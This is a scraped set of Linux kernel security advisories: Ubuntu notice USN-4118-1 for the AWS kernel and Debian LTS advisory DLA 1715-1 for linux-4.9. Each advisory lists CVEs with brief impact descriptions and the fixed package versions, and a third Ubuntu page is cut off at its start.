=== Content from usn.ubuntu.com_905599e4_20250125_213328.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4118-1: Linux kernel (AWS) vulnerabilities

2 September 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-aws-hwe](/security/cves?package=linux-aws-hwe) - Linux kernel for Amazon Web Services (AWS-HWE) systems

## Details

It was discovered that the alarmtimer implementation in the Linux kernel

contained an integer overflow vulnerability. A local attacker could use

this to cause a denial of service. ([CVE-2018-13053](/security/CVE-2018-13053))

Wen Xu discovered that the XFS filesystem implementation in the Linux

kernel did not properly track inode validations. An attacker could use this

to construct a malicious XFS image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13093](/security/CVE-2018-13093))

Wen Xu discovered that the f2fs file system implementation in the Linux

kernel did not properly validate metadata. An attacker could use this to

construct a malicious f2fs image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13096](/security/CVE-2018-13096), [CVE-2018-13097](/security/CVE-2018-13097), [CVE-2018-13098](/security/CVE-2018-13098),

[CVE-2018-13099](/security/CVE-2018-13099), [CVE-2018-13100](/security/CVE-2018-13100), [CVE-2018-14614](/security/CVE-2018-14614), [CVE-2018-14615](/security/CVE-2018-14615),

[CVE-2018-14616](/security/CVE-2018-14616))

Wen Xu and Po-Ning Tseng discovered that btrfs file system implementation

in the Linux kernel did not properly validate metadata. An attacker could

use this to construct a malicious btrfs image that, when mounted, could

cause a denial of service (system crash). ([CVE-2018-14609](/security/CVE-2018-14609), [CVE-2018-14610](/security/CVE-2018-14610),

[CVE-2018-14611](/security/CVE-2018-14611), [CVE-2018-14612](/security/CVE-2018-14612), [CVE-2018-14613](/security/CVE-2018-14613))

Wen Xu discovered that the HFS+ filesystem implementation in the Linux

kernel did not properly handle malformed catalog data in some situations.

An attacker could use this to construct a malicious HFS+ image that, when

mounted, could cause a denial of service (system crash). ([CVE-2018-14617](/security/CVE-2018-14617))

Vasily Averin and Pavel Tikhomirov discovered that the cleancache subsystem

of the Linux kernel did not properly initialize new files in some

situations. A local attacker could use this to expose sensitive

information. ([CVE-2018-16862](/security/CVE-2018-16862))

Hui Peng and Mathias Payer discovered that the Option USB High Speed driver

in the Linux kernel did not properly validate metadata received from the

device. A physically proximate attacker could use this to cause a denial of

service (system crash). ([CVE-2018-19985](/security/CVE-2018-19985))

Hui Peng and Mathias Payer discovered that the USB subsystem in the Linux

kernel did not properly handle size checks when handling an extra USB

descriptor. A physically proximate attacker could use this to cause a

denial of service (system crash). ([CVE-2018-20169](/security/CVE-2018-20169))

Zhipeng Xie discovered that an infinite loop could be triggered in the CFS

Linux kernel process scheduler. A local attacker could possibly use this to

cause a denial of service. ([CVE-2018-20784](/security/CVE-2018-20784))

It was discovered that a use-after-free error existed in the block layer

subsystem of the Linux kernel when certain failure conditions occurred. A

local attacker could possibly use this to cause a denial of service (system

crash) or possibly execute arbitrary code. ([CVE-2018-20856](/security/CVE-2018-20856))

Eli Biham and Lior Neumann discovered that the Bluetooth implementation in

the Linux kernel did not properly validate elliptic curve parameters during

Diffie-Hellman key exchange in some situations. An attacker could use this

to expose sensitive information. ([CVE-2018-5383](/security/CVE-2018-5383))

It was discovered that the Intel Wi-Fi device driver in the Linux kernel did

not properly validate certain Tunneled Direct Link Setup (TDLS). A

physically proximate attacker could use this to cause a denial of service

(Wi-Fi disconnect). ([CVE-2019-0136](/security/CVE-2019-0136))

It was discovered that a heap buffer overflow existed in the Marvell

Wireless LAN device driver for the Linux kernel. An attacker could use this

to cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-10126](/security/CVE-2019-10126))

It was discovered that the Bluetooth UART implementation in the Linux

kernel did not properly check for missing tty operations. A local attacker

could use this to cause a denial of service. ([CVE-2019-10207](/security/CVE-2019-10207))

Amit Klein and Benny Pinkas discovered that the Linux kernel did not

sufficiently randomize IP ID values generated for connectionless networking

protocols. A remote attacker could use this to track particular Linux

devices. ([CVE-2019-10638](/security/CVE-2019-10638))

Amit Klein and Benny Pinkas discovered that the location of kernel

addresses could be exposed by the implementation of connection-less network

protocols in the Linux kernel. A remote attacker could possibly use this to

assist in the exploitation of another vulnerability in the Linux kernel.

([CVE-2019-10639](/security/CVE-2019-10639))

Adam Zabrocki discovered that the Intel i915 kernel mode graphics driver in

the Linux kernel did not properly restrict mmap() ranges in some

situations. A local attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-11085](/security/CVE-2019-11085))

It was discovered that an integer overflow existed in the Linux kernel when

reference counting pages, leading to potential use-after-free issues. A

local attacker could use this to cause a denial of service (system crash)

or possibly execute arbitrary code. ([CVE-2019-11487](/security/CVE-2019-11487))

Jann Horn discovered that a race condition existed in the Linux kernel when

performing core dumps. A local attacker could use this to cause a denial of

service (system crash) or expose sensitive information. ([CVE-2019-11599](/security/CVE-2019-11599))

It was discovered that a null pointer dereference vulnerability existed in

the LSI Logic MegaRAID driver in the Linux kernel. A local attacker could

use this to cause a denial of service (system crash). ([CVE-2019-11810](/security/CVE-2019-11810))

It was discovered that a race condition leading to a use-after-free existed

in the Reliable Datagram Sockets (RDS) protocol implementation in the Linux

kernel. The RDS protocol is disabled via blocklist by default in Ubuntu.

If enabled, a local attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-11815](/security/CVE-2019-11815))

It was discovered that the ext4 file system implementation in the Linux

kernel did not properly zero out memory in some situations. A local

attacker could use this to expose sensitive information (kernel memory).

([CVE-2019-11833](/security/CVE-2019-11833))

It was discovered that the Bluetooth Human Interface Device Protocol (HIDP)

implementation in the Linux kernel did not properly verify strings were

NULL terminated in certain situations. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2019-11884](/security/CVE-2019-11884))

It was discovered that a NULL pointer dereference vulnerabilty existed in

the Near-field communication (NFC) implementation in the Linux kernel. An

attacker could use this to cause a denial of service (system crash).

([CVE-2019-12818](/security/CVE-2019-12818))

It was discovered that the MDIO bus devices subsystem in the Linux kernel

improperly dropped a device reference in an error condition, leading to a

use-after-free. An attacker could use this to cause a denial of service

(system crash). ([CVE-2019-12819](/security/CVE-2019-12819))

It was discovered that a NULL pointer dereference vulnerability existed in

the Near-field communication (NFC) implementation in the Linux kernel. A

local attacker could use this to cause a denial of service (system crash).

([CVE-2019-12984](/security/CVE-2019-12984))

Jann Horn discovered a use-after-free vulnerability in the Linux kernel

when accessing LDT entries in some situations. A local attacker could use

this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2019-13233](/security/CVE-2019-13233))

Jann Horn discovered that the ptrace implementation in the Linux kernel did

not properly record credentials in some situations. A local attacker could

use this to cause a denial of service (system crash) or possibly gain

administrative privileges. ([CVE-2019-13272](/security/CVE-2019-13272))

It was discovered that the GTCO tablet input driver in the Linux kernel did

not properly bounds check the initial HID report sent by the device. A

physically proximate attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-13631](/security/CVE-2019-13631))

It was discovered that the floppy driver in the Linux kernel did not

properly validate meta data, leading to a buffer overread. A local attacker

could use this to cause a denial of service (system crash).

([CVE-2019-14283](/security/CVE-2019-14283))

It was discovered that the floppy driver in the Linux kernel did not

properly validate ioctl() calls, leading to a division-by-zero. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2019-14284](/security/CVE-2019-14284))

Tuba Yavuz discovered that a race condition existed in the DesignWare USB3

DRD Controller device driver in the Linux kernel. A physically proximate

attacker could use this to cause a denial of service. ([CVE-2019-14763](/security/CVE-2019-14763))

It was discovered that an out-of-bounds read existed in the QLogic QEDI

iSCSI Initiator Driver in the Linux kernel. A local attacker could possibly

use this to expose sensitive information (kernel memory). ([CVE-2019-15090](/security/CVE-2019-15090))

It was discovered that the Raremono AM/FM/SW radio device driver in the

Linux kernel did not properly allocate memory, leading to a use-after-free.

A physically proximate attacker could use this to cause a denial of service

or possibly execute arbitrary code. ([CVE-2019-15211](/security/CVE-2019-15211))

It was discovered at a double-free error existed in the USB Rio 500 device

driver for the Linux kernel. A physically proximate attacker could use this

to cause a denial of service. ([CVE-2019-15212](/security/CVE-2019-15212))

It was discovered that a race condition existed in the Advanced Linux Sound

Architecture (ALSA) subsystem of the Linux kernel, leading to a potential

use-after-free. A physically proximate attacker could use this to cause a

denial of service (system crash) or possibly execute arbitrary code.

([CVE-2019-15214](/security/CVE-2019-15214))

It was discovered that a race condition existed in the CPiA2 video4linux

device driver for the Linux kernel, leading to a use-after-free. A

physically proximate attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-15215](/security/CVE-2019-15215))

It was discovered that a race condition existed in the Softmac USB Prism54

device driver in the Linux kernel. A physically proximate attacker could

use this to cause a denial of service (system crash). ([CVE-2019-15220](/security/CVE-2019-15220))

It was discovered that a use-after-free vulnerability existed in the

AppleTalk implementation in the Linux kernel if an error occurs during

initialization. A local attacker could use this to cause a denial of

service (system crash). ([CVE-2019-15292](/security/CVE-2019-15292))

It was discovered that the Empia EM28xx DVB USB device driver

implementation in the Linux kernel contained a use-after-free vulnerability

when disconnecting the device. An attacker could use this to cause a denial

of service (system crash). ([CVE-2019-2024](/security/CVE-2019-2024))

It was discovered that the USB video device class implementation in the

Linux kernel did not properly validate control bits, resulting in an out of

bounds buffer read. A local attacker could use this to possibly expose

sensitive information (kernel memory). ([CVE-2019-2101](/security/CVE-2019-2101))

It was discovered that the Marvell Wireless LAN device driver in the Linux

kernel did not properly validate the BSS descriptor. A local attacker could

possibly use this to cause a denial of service (system crash) or possibly

execute arbitrary code. ([CVE-2019-3846](/security/CVE-2019-3846))

Jason Wang discovered that an infinite loop vulnerability existed in the

virtio net driver in the Linux kernel. A local attacker in a guest VM could

possibly use this to cause a denial of service in the host system.

([CVE-2019-3900](/security/CVE-2019-3900))

Daniele Antonioli, Nils Ole Tippenhauer, and Kasper B. Rasmussen discovered

that the Bluetooth protocol BR/EDR specification did not properly require

sufficiently strong encryption key lengths. A physically proximate attacker

could use this to expose sensitive information. ([CVE-2019-9506](/security/CVE-2019-9506))

It was discovered that the Appletalk IP encapsulation driver in the Linux

kernel did not properly prevent kernel addresses from being copied to user

space. A local attacker with the CAP\_NET\_ADMIN capability could use this to

expose sensitive information. ([CVE-2018-20511](/security/CVE-2018-20511))

It was discovered that a race condition existed in the USB YUREX device

driver in the Linux kernel. A physically proximate attacker could use this

to cause a denial of service (system crash). ([CVE-2019-15216](/security/CVE-2019-15216))

It was discovered that the Siano USB MDTV receiver device driver in the

Linux kernel made improper assumptions about the device characteristics. A

physically proximate attacker could use this cause a denial of service

(system crash). ([CVE-2019-15218](/security/CVE-2019-15218))

It was discovered that the Line 6 POD USB device driver in the Linux kernel

did not properly validate data size information from the device. A

physically proximate attacker could use this to cause a denial of service

(system crash). ([CVE-2019-15221](/security/CVE-2019-15221))

Muyu Yu discovered that the CAN implementation in the Linux kernel in some

situations did not properly restrict the field size when processing

outgoing frames. A local attacker with CAP\_NET\_ADMIN privileges could use

this to execute arbitrary code. ([CVE-2019-3701](/security/CVE-2019-3701))

Vladis Dronov discovered that the debug interface for the Linux kernel's

HID subsystem did not properly validate passed parameters in some

situations. A local privileged attacker could use this to cause a denial of

service (infinite loop). ([CVE-2019-3819](/security/CVE-2019-3819))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.15.0-1047-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.15.0-1047.49](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.15.0-1047.49)
* [linux-image-aws](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws)
  -
  [4.15.0.1047.46](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws/4.15.0.1047.46)

##### Ubuntu 16.04

* [linux-image-4.15.0-1047-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws-hwe)
  -
  [4.15.0-1047.49~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-aws-hwe/4.15.0-1047.49~16.04.1)
* [linux-image-aws-hwe](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws-hwe)
  -
  [4.15.0.1047.47](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws-hwe/4.15.0.1047.47)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-13053](/security/CVE-2018-13053)
* [CVE-2018-13093](/security/CVE-2018-13093)
* [CVE-2018-13096](/security/CVE-2018-13096)
* [CVE-2018-13097](/security/CVE-2018-13097)
* [CVE-2018-13098](/security/CVE-2018-13098)
* [CVE-2018-13099](/security/CVE-2018-13099)
* [CVE-2018-13100](/security/CVE-2018-13100)
* [CVE-2018-14609](/security/CVE-2018-14609)
* [CVE-2018-14610](/security/CVE-2018-14610)
* [CVE-2018-14611](/security/CVE-2018-14611)
* [CVE-2018-14612](/security/CVE-2018-14612)
* [CVE-2018-14613](/security/CVE-2018-14613)
* [CVE-2018-14614](/security/CVE-2018-14614)
* [CVE-2018-14615](/security/CVE-2018-14615)
* [CVE-2018-14616](/security/CVE-2018-14616)
* [CVE-2018-14617](/security/CVE-2018-14617)
* [CVE-2018-16862](/security/CVE-2018-16862)
* [CVE-2018-19985](/security/CVE-2018-19985)
* [CVE-2018-20169](/security/CVE-2018-20169)
* [CVE-2018-20511](/security/CVE-2018-20511)
* [CVE-2018-20784](/security/CVE-2018-20784)
* [CVE-2018-20856](/security/CVE-2018-20856)
* [CVE-2018-5383](/security/CVE-2018-5383)
* [CVE-2019-0136](/security/CVE-2019-0136)
* [CVE-2019-10126](/security/CVE-2019-10126)
* [CVE-2019-10207](/security/CVE-2019-10207)
* [CVE-2019-10638](/security/CVE-2019-10638)
* [CVE-2019-10639](/security/CVE-2019-10639)
* [CVE-2019-11085](/security/CVE-2019-11085)
* [CVE-2019-11487](/security/CVE-2019-11487)
* [CVE-2019-11599](/security/CVE-2019-11599)
* [CVE-2019-11810](/security/CVE-2019-11810)
* [CVE-2019-11815](/security/CVE-2019-11815)
* [CVE-2019-11833](/security/CVE-2019-11833)
* [CVE-2019-11884](/security/CVE-2019-11884)
* [CVE-2019-12818](/security/CVE-2019-12818)
* [CVE-2019-12819](/security/CVE-2019-12819)
* [CVE-2019-12984](/security/CVE-2019-12984)
* [CVE-2019-13233](/security/CVE-2019-13233)
* [CVE-2019-13272](/security/CVE-2019-13272)
* [CVE-2019-13631](/security/CVE-2019-13631)
* [CVE-2019-14283](/security/CVE-2019-14283)
* [CVE-2019-14284](/security/CVE-2019-14284)
* [CVE-2019-14763](/security/CVE-2019-14763)
* [CVE-2019-15090](/security/CVE-2019-15090)
* [CVE-2019-15211](/security/CVE-2019-15211)
* [CVE-2019-15212](/security/CVE-2019-15212)
* [CVE-2019-15214](/security/CVE-2019-15214)
* [CVE-2019-15215](/security/CVE-2019-15215)
* [CVE-2019-15216](/security/CVE-2019-15216)
* [CVE-2019-15218](/security/CVE-2019-15218)
* [CVE-2019-15220](/security/CVE-2019-15220)
* [CVE-2019-15221](/security/CVE-2019-15221)
* [CVE-2019-15292](/security/CVE-2019-15292)
* [CVE-2019-2024](/security/CVE-2019-2024)
* [CVE-2019-2101](/security/CVE-2019-2101)
* [CVE-2019-3701](/security/CVE-2019-3701)
* [CVE-2019-3819](/security/CVE-2019-3819)
* [CVE-2019-3846](/security/CVE-2019-3846)
* [CVE-2019-3900](/security/CVE-2019-3900)
* [CVE-2019-9506](/security/CVE-2019-9506)

## Related notices

* [USN-3821-1](/security/notices/USN-3821-1)
* [USN-4094-1](/security/notices/USN-4094-1)
* [USN-3821-2](/security/notices/USN-3821-2)
* [USN-4708-1](/security/notices/USN-4708-1)
* [USN-4709-1](/security/notices/USN-4709-1)
* [USN-3932-1](/security/notices/USN-3932-1)
* [USN-3932-2](/security/notices/USN-3932-2)
* [USN-3879-1](/security/notices/USN-3879-1)
* [USN-3879-2](/security/notices/USN-3879-2)
* [USN-4115-1](/security/notices/USN-4115-1)
* [USN-3910-2](/security/notices/USN-3910-2)
* [USN-3910-1](/security/notices/USN-3910-1)
* [USN-4211-2](/security/notices/USN-4211-2)
* [USN-4211-1](/security/notices/USN-4211-1)
* [USN-4116-1](/security/notices/USN-4116-1)
* [USN-4095-1](/security/notices/USN-4095-1)
* [USN-4095-2](/security/notices/USN-4095-2)
* [USN-4351-1](/security/notices/USN-4351-1)
* [USN-4145-1](/security/notices/USN-4145-1)
* [USN-4147-1](/security/notices/USN-4147-1)
* [USN-4117-1](/security/notices/USN-4117-1)
* [USN-4093-1](/security/notices/USN-4093-1)
* [USN-4114-1](/security/notices/USN-4114-1)
* [USN-4068-2](/security/notices/USN-4068-2)
* [USN-4068-1](/security/notices/USN-4068-1)
* [USN-4069-2](/security/notices/USN-4069-2)
* [USN-4069-1](/security/notices/USN-4069-1)
* [USN-4008-1](/security/notices/USN-4008-1)
* [USN-4008-3](/security/notices/USN-4008-3)
* [USN-4005-1](/security/notices/USN-4005-1)
* [USN-4076-1](/security/notices/USN-4076-1)
* [USN-4286-1](/security/notices/USN-4286-1)
* [USN-4286-2](/security/notices/USN-4286-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lists.debian.org_5c55de79_20250125_213321.html ===


---

[[Date Prev](msg00016.html)][[Date Next](msg00018.html)]
[[Thread Prev](msg00016.html)][[Thread Next](msg00018.html)]
[[Date Index](maillist.html#00017)]
[[Thread Index](threads.html#00017)]

# [SECURITY] [DLA 1715-1] linux-4.9 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1715-1] linux-4.9 security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Fri, 15 Mar 2019 22:45:15 +0000
* *Message-id*: <[[🔎]](/msgid-search/4e418020e07569ef54a90afa3ffa8c0d6f28de24.camel%40debian.org) [4e418020e07569ef54a90afa3ffa8c0d6f28de24.camel@debian.org](msg00017.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
Package        : linux-4.9
Version        : 4.9.144-3.1~deb8u1
CVE ID         : CVE-2017-18249 CVE-2018-1128 CVE-2018-1129 CVE-2018-3639
                 CVE-2018-5391 CVE-2018-5848 CVE-2018-6554 CVE-2018-12896
                 CVE-2018-13053 CVE-2018-13096 CVE-2018-13097 CVE-2018-13100
                 CVE-2018-13406 CVE-2018-14610 CVE-2018-14611 CVE-2018-14612
                 CVE-2018-14613 CVE-2018-14614 CVE-2018-14616 CVE-2018-15471
                 CVE-2018-16862 CVE-2018-17972 CVE-2018-18281 CVE-2018-18690
                 CVE-2018-18710 CVE-2018-19407
Debian Bug     : 890034 896911 907581 915229 915231

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2017-18249

    A race condition was discovered in the disk space allocator of
    F2FS. A user with access to an F2FS volume could use this to cause
    a denial of service or other security impact.

CVE-2018-1128, CVE-2018-1129

    The cephx authentication protocol used by Ceph was susceptible to
    replay attacks, and calculated signatures incorrectly. These
    vulnerabilities in the server required changes to authentication
    that are incompatible with existing clients. The kernel's client
    code has now been updated to be compatible with the fixed server.

CVE-2018-3639 (SSB)

    Multiple researchers have discovered that Speculative Store Bypass
    (SSB), a feature implemented in many processors, could be used to
    read sensitive information from another context. In particular,
    code in a software sandbox may be able to read sensitive
    information from outside the sandbox. This issue is also known as
    Spectre variant 4.

    This update adds a further mitigation for this issue in the eBPF
    (Extended Berkeley Packet Filter) implementation.

CVE-2018-5391 (FragmentSmack)

    Juha-Matti Tilli discovered a flaw in the way the Linux kernel
    handled reassembly of fragmented IPv4 and IPv6 packets. A remote
    attacker can take advantage of this flaw to trigger time and
    calculation expensive fragment reassembly algorithms by sending
    specially crafted packets, leading to remote denial of service.

    This was previously mitigated by reducing the default limits on
    memory usage for incomplete fragmented packets. This update
    replaces that mitigation with a more complete fix.

CVE-2018-5848

    The wil6210 wifi driver did not properly validate lengths in scan
    and connection requests, leading to a possible buffer overflow.
    On systems using this driver, a local user with the CAP_NET_ADMIN
    capability could use this for denial of service (memory corruption
    or crash) or potentially for privilege escalation.

CVE-2018-12896, CVE-2018-13053

    Team OWL337 reported possible integer overflows in the POSIX
    timer implementation. These might have some security impact.

CVE-2018-13096, CVE-2018-13097, CVE-2018-13100, CVE-2018-14614,
CVE-2018-14616

    Wen Xu from SSLab at Gatech reported that crafted F2FS volumes
    could trigger a crash (BUG, Oops, or division by zero) and/or
    out-of-bounds memory access. An attacker able to mount such a
    volume could use this to cause a denial of service or possibly for
    privilege escalation.

CVE-2018-13406

    Dr Silvio Cesare of InfoSect reported a potential integer overflow
    in the uvesafb driver. A user with permission to access such a
    device might be able to use this for denial of service or
    privilege escalation.

CVE-2018-14610, CVE-2018-14611, CVE-2018-14612, CVE-2018-14613

    Wen Xu from SSLab at Gatech reported that crafted Btrfs volumes
    could trigger a crash (Oops) and/or out-of-bounds memory access.
    An attacker able to mount such a volume could use this to cause a
    denial of service or possibly for privilege escalation.

CVE-2018-15471 ((XSA-270)

    Felix Wilhelm of Google Project Zero discovered a flaw in the hash
    handling of the xen-netback Linux kernel module. A malicious or
    buggy frontend may cause the (usually privileged) backend to make
    out of bounds memory accesses, potentially resulting in privilege
    escalation, denial of service, or information leaks.

    <https://xenbits.xen.org/xsa/advisory-270.html>

CVE-2018-16862

    Vasily Averin and Pavel Tikhomirov from Virtuozzo Kernel Team
    discovered that the cleancache memory management feature did not
    invalidate cached data for deleted files. On Xen guests using the
    tmem driver, local users could potentially read data from other
    users' deleted files if they were able to create new files on the
    same volume.

CVE-2018-17972

    Jann Horn reported that the /proc/*/stack files in procfs leaked
    sensitive data from the kernel. These files are now only readable
    by users with the CAP_SYS_ADMIN capability (usually only root)

CVE-2018-18281

    Jann Horn reported a race condition in the virtual memory manager
    that can result in a process briefly having access to memory after
    it is freed and reallocated. A local user could possibly exploit
    this for denial of service (memory corruption) or for privilege
    escalation.

CVE-2018-18690

    Kanda Motohiro reported that XFS did not correctly handle some
    xattr (extended attribute) writes that require changing the disk
    format of the xattr. A user with access to an XFS volume could use
    this for denial of service.

CVE-2018-18710

    It was discovered that the cdrom driver does not correctly
    validate the parameter to the CDROM_SELECT_DISC ioctl. A user with
    access to a cdrom device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-19407

    Wei Wu reported a potential crash (Oops) in the KVM implementation
    for x86 processors. A user with access to /dev/kvm could use this
    for denial of service.

For Debian 8 "Jessie", these problems have been fixed in version
4.9.144-3.1~deb8u1.  This version also includes fixes for Debian bugs
#890034, #896911, #907581, #915229, and #915231; and other fixes
included in upstream stable updates.

We recommend that you upgrade your linux-4.9 packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

--
Ben Hutchings - Debian developer, member of kernel, installer and LTS teams

```

**Attachment:
[signature.asc](pgpBdxOYtpI06.pgp)**

*Description:* This is a digitally signed message part

---



=== Content from usn.ubuntu.com_4b95e6d6_20250125_213325.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
